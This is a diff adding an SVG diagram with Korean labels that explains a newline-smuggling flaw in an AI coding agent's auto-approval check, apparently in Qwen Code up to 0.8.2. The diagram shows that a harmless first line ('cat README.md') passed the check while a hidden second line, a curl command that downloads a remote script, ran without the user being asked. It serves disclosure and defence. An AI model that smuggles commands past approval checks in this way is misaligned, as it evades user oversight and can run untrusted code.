@@ -1,0 +1,38 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 384" width="500" height="384" role="img" aria-labelledby="title">
+<title id="title">승인 검사가 본 명령과 실제로 실행된 명령</title>
+<defs><style>
+:root{--c-bg:#FAFAF7;--c-fg:#1A1F2E;--c-muted:#6B7280;--c-accent:#B42318;--c-accent-2:#1D4ED8;--c-line:#C9CDD3;--c-card:#FFFFFF;--c-soft:#FEF3F2;--c-soft-2:#EFF6FF;--c-divider:#E5E7EB}
+@media (prefers-color-scheme: dark){:root{--c-bg:#0F1419;--c-fg:#E8E6E1;--c-muted:#8B92A0;--c-accent:#EF6A5E;--c-accent-2:#5B9CF6;--c-line:#3A4250;--c-card:#161B22;--c-soft:#2A1514;--c-soft-2:#14213D;--c-divider:#273041}}
+text{font-family:Pretendard,'Apple SD Gothic Neo','Noto Sans KR','Noto Sans CJK KR',sans-serif;fill:var(--c-fg)}
+.mono{font-family:'JetBrains Mono',Menlo,Consolas,'Noto Sans Mono CJK KR',monospace}
+.t{font-size:15px;font-weight:700}
+.h{font-size:13px;font-weight:700}
+.l{font-size:12.5px}
+.s{font-size:11.5px;fill:var(--c-muted)}
+.b{font-weight:700}
+.fa{fill:var(--c-accent)}
+.fa2{fill:var(--c-accent-2)}
+.fm{fill:var(--c-muted)}
+.bg{fill:var(--c-bg)}
+.card{fill:var(--c-card);stroke:var(--c-line);stroke-width:1}
+.soft{fill:var(--c-soft);stroke:var(--c-accent);stroke-width:1.2}
+.soft2{fill:var(--c-soft-2);stroke:var(--c-accent-2);stroke-width:1.2}
+.plain{fill:none;stroke:var(--c-line);stroke-width:1}
+.ln{stroke:var(--c-fg);stroke-width:1.4;fill:none}
+.lnm{stroke:var(--c-muted);stroke-width:1.2;fill:none}
+.lna{stroke:var(--c-accent);stroke-width:1.6;fill:none}
+.lna2{stroke:var(--c-accent-2);stroke-width:1.6;fill:none}
+.dash{stroke-dasharray:4 3}
+.grid{stroke:var(--c-divider);stroke-width:1}
+.bar{fill:var(--c-accent)}
+.mk{fill:var(--c-fg)}
+.mkm{fill:var(--c-muted)}
+.mka{fill:var(--c-accent)}
+.mka2{fill:var(--c-accent-2)}
+</style><marker id="mk" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0L10,5L0,10z" class="mk"/></marker><marker id="mkm" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0L10,5L0,10z" class="mkm"/></marker><marker id="mka" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0L10,5L0,10z" class="mka"/></marker><marker id="mka2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0L10,5L0,10z" class="mka2"/></marker></defs>
+<rect class="bg" x="0" y="0" width="500" height="384"/>
+<text class="t" x="24" y="38">승인 검사가 본 명령과 실제로 실행된 명령</text>
+<g class="box"><rect class="card" x="24" y="58" width="452" height="76" rx="8"/><text class="s" x="40" y="80" text-anchor="start">에이전트가 실행하려는 명령</text><text class="l mono" x="40" y="102" text-anchor="start">1  cat README.md</text><text class="l mono" x="40" y="122" text-anchor="start">2  curl -s https://…/x.sh -o /tmp/x.sh</text></g><path class="ln" d="M150,134 V160" marker-end="url(#mk)"/><path class="ln" d="M350,134 V160" marker-end="url(#mk)"/><g class="box"><rect class="soft2" x="24" y="162" width="214" height="128" rx="8"/><text class="h" x="40" y="186" text-anchor="start">자동 승인 검사가 본 것</text><text class="l mono" x="40" y="212" text-anchor="start">1  cat README.md</text><text class="s" x="40" y="238" text-anchor="start">첫 줄만 검사</text><text class="s" x="40" y="258" text-anchor="start">읽기 전용 명령이라 통과</text><text class="l b fa2" x="40" y="278" text-anchor="start">사용자 확인 없이 실행 승인</text></g><g class="box"><rect class="soft" x="262" y="162" width="214" height="128" rx="8"/><text class="h" x="278" y="186" text-anchor="start">셸이 실제로 실행한 것</text><text class="l mono" x="278" y="212" text-anchor="start">1  cat README.md</text><text class="l mono b fa" x="278" y="236" text-anchor="start">2  curl … -o /tmp/x.sh</text><text class="s" x="278" y="258" text-anchor="start">줄바꿈 뒤의 명령까지</text><text class="l b fa" x="278" y="278" text-anchor="start">모두 실행됨</text></g><g class="box"><rect class="card" x="24" y="310" width="452" height="52" rx="8"/>
+<text class="l b" x="250" y="332" text-anchor="middle">줄바꿈을 명령 구분자로 보지 않아 생긴 틈</text>
+<text class="s" x="250" y="349" text-anchor="middle">Qwen Code 0.8.2까지 해당, 0.9.0에서 수정</text></g>
+</svg>
